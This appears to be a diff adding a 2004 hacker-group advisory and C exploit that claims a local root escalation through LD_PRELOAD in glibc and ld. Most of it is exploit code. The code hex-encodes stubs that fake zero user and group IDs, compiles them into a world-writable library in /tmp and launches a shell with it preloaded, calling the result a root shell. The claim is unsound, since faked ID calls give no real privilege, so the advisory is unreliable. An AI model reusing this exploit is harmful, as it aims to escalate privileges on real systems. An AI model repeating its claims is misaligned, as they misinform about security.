@@ -1,0 +1,127 @@
+/*
+--------------------------------------------------------
+[N]eo [S]ecurity [T]eam [NST]® - Advisory #01 - 28/12/04
+--------------------------------------------------------
+Program:  libc & ld - The GNU linker
+Homepage:  http://gcc.gnu.org
+Vulnerable Versions: GNU gcc 3.4.3 and prior
+Risk: High!!
+Impact: Unchecked length fields
+---------------------------------------------------------
+
+- Description
+---------------------------------------------------------
+$ LD_PRELOAD=/`perl -e 'print "A"x2000'`/ passwd
+Value starts and ends with a slash and contains about 1200 characters.
+LD_PRELOAD doesn't ignore setuid executables, like this one.
+Unchecked lenght fields.
+
+setuid(0);
+setreuid(0,0);
+int getuid() { return 0; }
+int geteuid() { return 0; }
+int getgid() { return 0; }
+int getegid() { return 0; }
+
+- Tested
+---------------------------------------------------------
+I have done minimal testing on this.
+Slackware 10.0
+
+- Explotation
+---------------------------------------------------------
+$gcc ld_xpl_nst.c -o ld_xp_nst
+$./ld_xp_nst
+sh-3.00# id
+uid=0(root) gid=0(root) groups=100(users)
+sh-3.00# 
+
+This will give you a root shell
+ 
+- Solutions
+--------------------------------------------------------
+Not Yet or i don't know xD
+
+- References
+--------------------------------------------------------
+http://neosecurityteam.org/Advisories/Advisory-01.txt
+
+
+- Credits
+-------------------------------------------------
+Discovered by HaCkZaTaN <hck_zatan@hotmail.com>
+
+[N]eo [S]ecurity [T]eam [NST]® - http://neosecurityteam.net/
+
+Got Questions? http://neosecurityteam.net/foros/
+
+- Exploit
+-------------------------------------------------
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char NstCode[] =
+//int getuid() { setuid(0); return 0; }
+"\x69\x6E\x74\x20\x67\x65\x74\x75\x69\x64\x28\x29\x20\x7B\x20"
+"\x73\x65\x74\x75\x69\x64\x28\x30\x29\x3B\x20\x72\x65\x74\x75"
+"\x72\x6E\x20\x30\x3B\x20\x7D\x0a"
+
+//int geteuid() { seteuid(0); return 0; }
+"\x69\x6E\x74\x20\x67\x65\x74\x65\x75\x69\x64\x28\x29\x20\x7B"
+"\x20\x73\x65\x74\x65\x75\x69\x64\x28\x30\x29\x3B\x20\x72\x65"
+"\x74\x75\x72\x6E\x20\x30\x3B\x20\x7D\x0a"
+
+//int getgid() { setgid(0); return 0; }
+"\x69\x6E\x74\x20\x67\x65\x74\x67\x69\x64\x28\x29\x20\x7B\x20"
+"\x73\x65\x74\x67\x69\x64\x28\x30\x29\x3B\x20\x72\x65\x74\x75"
+"\x72\x6E\x20\x30\x3B\x20\x7D\x0a"
+
+//int getegid() { setegid(0); return 0; }
+"\x69\x6E\x74\x20\x67\x65\x74\x65\x67\x69\x64\x28\x29\x20\x7B"
+"\x20\x73\x65\x74\x65\x67\x69\x64\x28\x30\x29\x3B\x20\x72\x65"
+"\x74\x75\x72\x6E\x20\x30\x3B\x20\x7D\x0a"
+"\x0/bin/sh";
+
+void FG(int Opt, int Colour);
+void RC();
+
+int main()
+{
+	FILE *Nst_C;
+	int x, y;
+    for(x = 1; x < 2; x++)
+    for(y = 37; y < 38; y++)
+    {
+          FG(x,y);
+          printf("[N]eo [S]ecurity [T]eam [N][S][T]!\n");
+          } RC();
+    
+    Nst_C=fopen("/tmp/nst.c","w");
+    fprintf(Nst_C,"%s",NstCode);
+    fclose(Nst_C);
+    
+    system("gcc -c -o /tmp/nst.o /tmp/nst.c;rm -rf /tmp/nst.c");
+    system("ld -shared -o /tmp/nstroot.so /tmp/nst.o");
+    system("chmod 777 /tmp/nstroot.so");
+    system("LD_PRELOAD=/tmp/nstroot.so /bin/sh");
+    
+    for(x = 1; x < 2; x++)
+    for(y = 37; y < 38; y++)
+    {
+          FG(x,y);
+          printf("[N]eo [S]ecurity [T]eam [N][S][T]!\n");
+    } RC();
+    return 0;
+}
+
+void FG(int Opt, int Colour) {
+  printf("\033[%d;%dm", Opt, Colour);
+}
+
+void RC() {
+  printf("\033[0;m");
+}
